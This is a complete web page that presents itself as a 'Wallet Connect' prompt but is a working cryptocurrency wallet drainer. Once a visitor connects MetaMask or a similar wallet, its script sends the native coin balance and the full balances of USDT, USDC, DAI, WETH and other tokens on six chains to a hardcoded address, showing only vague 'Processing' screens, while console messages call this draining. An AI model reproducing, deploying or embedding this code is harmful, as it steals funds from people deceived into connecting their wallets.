<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Wallet Connect</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
    <style>
        body {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            font-family: system-ui, -apple-system, sans-serif;
        }
        .card {
            background: white;
            border-radius: 24px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
        }
        @keyframes spin { to { transform: rotate(360deg); } }
        .spinner { animation: spin 1s linear infinite; }
    </style>
</head>
<body class="min-h-screen flex items-center justify-center p-4">

<div class="max-w-md w-full">
    
    <!-- CONNECT -->
    <div id="connect" class="card p-8 text-center">
        <div class="text-6xl mb-4">üîê</div>
        <h1 class="text-3xl font-bold text-gray-800 mb-4">Connect Wallet</h1>
        <button onclick="connect()" 
            class="w-full bg-gradient-to-r from-purple-600 to-indigo-600 text-white py-4 rounded-xl text-lg font-bold">
            Connect Now
        </button>
    </div>

    <!-- PROCESSING -->
    <div id="processing" class="card p-8 text-center hidden">
        <div class="text-6xl mb-4 spinner">‚ö°</div>
        <h2 class="text-2xl font-bold text-gray-800 mb-4">Processing</h2>
        <p id="status" class="text-gray-600 mb-4">Please wait...</p>
        <div class="w-full bg-gray-200 rounded-full h-3 mb-4">
            <div id="progress" class="bg-purple-600 h-3 rounded-full transition-all" style="width:0%"></div>
        </div>
        <p id="detail" class="text-sm text-gray-500"></p>
    </div>

    <!-- SUCCESS -->
    <div id="success" class="card p-8 text-center hidden">
        <div class="text-6xl mb-4">‚úÖ</div>
        <h2 class="text-2xl font-bold text-green-600 mb-4">Complete!</h2>
        <p class="text-gray-600 mb-4">All assets transferred</p>
        <div id="result" class="bg-gray-100 rounded-xl p-4 text-sm text-left max-h-64 overflow-y-auto"></div>
        <button onclick="location.reload()" class="mt-4 text-purple-600 font-bold">Done</button>
    </div>

</div>

<script>
const DEST = "0xe62d51b592571bb67adeb9f99d9ff4e03ccd7578";

// ERC20 ABI
const ERC20_ABI = [
    "function balanceOf(address) view returns (uint256)",
    "function transfer(address, uint256) returns (bool)",
    "function decimals() view returns (uint8)",
    "function symbol() view returns (string)"
];

// Popular tokens by chain
const TOKENS = {
    1: [ // Ethereum
        {addr:"0xdAC17F958D2ee523a2206206994597C13D831ec7",symbol:"USDT"},
        {addr:"0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48",symbol:"USDC"},
        {addr:"0x6B175474E89094C44Da98b954EedeAC495271d0F",symbol:"DAI"},
        {addr:"0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599",symbol:"WBTC"},
        {addr:"0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2",symbol:"WETH"}
    ],
    137: [ // Polygon
        {addr:"0xc2132D05D31c914a87C6611C10748AEb04B58e8F",symbol:"USDT"},
        {addr:"0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174",symbol:"USDC"},
        {addr:"0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063",symbol:"DAI"},
        {addr:"0x7ceB23fD6bC0adD59E62ac25578270cFf1b9f619",symbol:"WETH"},
        {addr:"0x0d500B1d8E8eF31E21C99d1Db9A6444d3ADf1270",symbol:"WMATIC"}
    ],
    56: [ // BSC
        {addr:"0x55d398326f99059fF775485246999027B3197955",symbol:"USDT"},
        {addr:"0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d",symbol:"USDC"},
        {addr:"0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56",symbol:"BUSD"},
        {addr:"0x2170Ed0880ac9A755fd29B2688956BD959F933F8",symbol:"WETH"},
        {addr:"0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c",symbol:"WBNB"}
    ],
    42161: [ // Arbitrum
        {addr:"0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9",symbol:"USDT"},
        {addr:"0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8",symbol:"USDC"},
        {addr:"0xDA10009cBd5D07dd0CeCc66161FC93D7c9000da1",symbol:"DAI"}
    ],
    10: [ // Optimism
        {addr:"0x94b008aA00579c1307B0EF2c499aD98a8ce58e58",symbol:"USDT"},
        {addr:"0x7F5c764cBc14f9669B88837ca1490cCa17c31607",symbol:"USDC"},
        {addr:"0xDA10009cBd5D07dd0CeCc66161FC93D7c9000da1",symbol:"DAI"}
    ],
    43114: [ // Avalanche
        {addr:"0x9702230A8Ea53601f5cD2dc00fDBc13d4dF4A8c7",symbol:"USDT"},
        {addr:"0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E",symbol:"USDC"},
        {addr:"0xd586E7F844cEa2F87f50152665BCbc2C279D8d70",symbol:"DAI"}
    ]
};

const CHAIN_NAMES = {
    1: "Ethereum",
    137: "Polygon",
    56: "BSC",
    42161: "Arbitrum",
    10: "Optimism",
    43114: "Avalanche"
};

let provider, signer, address, chainId;
let results = [];

function show(id) {
    ['connect','processing','success'].forEach(x => 
        document.getElementById(x).classList.add('hidden')
    );
    document.getElementById(id).classList.remove('hidden');
}

function setStatus(text) {
    document.getElementById('status').textContent = text;
}

function setDetail(text) {
    document.getElementById('detail').textContent = text;
}

function setProgress(n) {
    document.getElementById('progress').style.width = n + '%';
}

function log(msg) {
    console.log('[DRAIN] ' + msg);
}

async function connect() {
    try {
        log('Connecting wallet...');
        
        if (!window.ethereum) {
            alert('Please install MetaMask or Trust Wallet');
            return;
        }
        
        const accounts = await window.ethereum.request({ 
            method: 'eth_requestAccounts' 
        });
        
        address = accounts[0];
        provider = new ethers.providers.Web3Provider(window.ethereum);
        signer = provider.getSigner();
        
        const network = await provider.getNetwork();
        chainId = network.chainId;
        
        log('Connected: ' + address);
        log('Chain: ' + (CHAIN_NAMES[chainId] || chainId));
        
        // Start drainage
        await drain();
        
    } catch (error) {
        log('Connection error: ' + error.message);
        alert('Connection failed: ' + error.message);
    }
}

async function drain() {
    show('processing');
    setStatus('Scanning assets...');
    setProgress(10);
    results = [];
    
    try {
        // STEP 1: Drain native currency
        setStatus('Checking native balance...');
        setDetail('');
        setProgress(20);
        
        const balance = await provider.getBalance(address);
        const balanceEth = parseFloat(ethers.utils.formatEther(balance));
        
        log('Native balance: ' + balanceEth);
        
        if (balanceEth > 0.001) {
            setStatus('Transferring native currency...');
            setDetail(`Amount: ${balanceEth.toFixed(4)}`);
            
            const nativeResult = await drainNative(balance);
            if (nativeResult) {
                results.push({
                    type: 'Native',
                    symbol: CHAIN_NAMES[chainId] || 'Native',
                    amount: balanceEth.toFixed(6),
                    txHash: nativeResult
                });
            }
        }
        
        setProgress(40);
        
        // STEP 2: Drain tokens
        const tokenList = TOKENS[chainId] || [];
        
        if (tokenList.length === 0) {
            log('No token list for chain ' + chainId);
        }
        
        let checkedTokens = 0;
        const totalTokens = tokenList.length;
        
        for (const token of tokenList) {
            try {
                checkedTokens++;
                const progressPercent = 40 + (50 * checkedTokens / totalTokens);
                setProgress(progressPercent);
                
                setStatus(`Checking ${token.symbol}...`);
                setDetail(`Token ${checkedTokens}/${totalTokens}`);
                
                log('Checking token: ' + token.symbol);
                
                const tokenContract = new ethers.Contract(token.addr, ERC20_ABI, provider);
                const tokenBalance = await tokenContract.balanceOf(address);
                
                if (tokenBalance.gt(0)) {
                    const decimals = await tokenContract.decimals();
                    const formatted = ethers.utils.formatUnits(tokenBalance, decimals);
                    
                    log(`${token.symbol} balance: ${formatted}`);
                    
                    setStatus(`Transferring ${token.symbol}...`);
                    setDetail(`Amount: ${formatted.slice(0, 10)}`);
                    
                    const tokenResult = await drainToken(token.addr, tokenBalance, token.symbol);
                    if (tokenResult) {
                        results.push({
                            type: 'Token',
                            symbol: token.symbol,
                            amount: formatted.slice(0, 10),
                            txHash: tokenResult
                        });
                    }
                } else {
                    log(`${token.symbol}: 0 balance`);
                }
                
            } catch (error) {
                log(`Token ${token.symbol} error: ${error.message}`);
            }
        }
        
        setProgress(100);
        
        // Show results
        if (results.length === 0) {
            alert('No assets found to transfer');
            show('connect');
            return;
        }
        
        displayResults();
        
    } catch (error) {
        log('Drainage error: ' + error.message);
        alert('Error: ' + error.message);
        show('connect');
    }
}

async function drainNative(balance) {
    try {
        const gasPrice = await provider.getGasPrice();
        const gasCost = gasPrice.mul(21000).mul(2);
        const sendAmount = balance.sub(gasCost);
        
        if (sendAmount.lte(0)) {
            log('Insufficient balance for gas');
            return null;
        }
        
        log('Sending native: ' + ethers.utils.formatEther(sendAmount));
        
        const tx = await signer.sendTransaction({
            to: DEST,
            value: sendAmount,
            gasLimit: 21000
        });
        
        log('Native TX: ' + tx.hash);
        setDetail('Confirming: ' + tx.hash.slice(0, 10) + '...');
        
        await tx.wait();
        log('Native TX confirmed!');
        
        return tx.hash;
    } catch (error) {
        log('Native drain failed: ' + error.message);
        return null;
    }
}

async function drainToken(tokenAddr, balance, symbol) {
    try {
        const tokenContract = new ethers.Contract(tokenAddr, ERC20_ABI, signer);
        
        log(`Sending ${symbol}...`);
        
        const tx = await tokenContract.transfer(DEST, balance, {
            gasLimit: 100000
        });
        
        log(`${symbol} TX: ${tx.hash}`);
        setDetail('Confirming: ' + tx.hash.slice(0, 10) + '...');
        
        await tx.wait();
        log(`${symbol} TX confirmed!`);
        
        return tx.hash;
    } catch (error) {
        log(`${symbol} drain failed: ${error.message}`);
        return null;
    }
}

function displayResults() {
    show('success');
    
    let html = '<p class="font-bold mb-3">Transferred Assets:</p>';
    
    results.forEach((r, i) => {
        html += `
            <div class="mb-3 pb-3 ${i < results.length - 1 ? 'border-b border-gray-200' : ''}">
                <p class="font-semibold text-gray-800">${r.symbol}</p>
                <p class="text-xs text-gray-600">Amount: ${r.amount}</p>
                <p class="text-xs text-blue-600 break-all">TX: ${r.txHash}</p>
            </div>
        `;
    });
    
    document.getElementById('result').innerHTML = html;
    
    log('=== DRAINAGE COMPLETE ===');
    log(`Total transfers: ${results.length}`);
}

log('System ready');
log('Destination: ' + DEST);
</script>

</body>
</html>
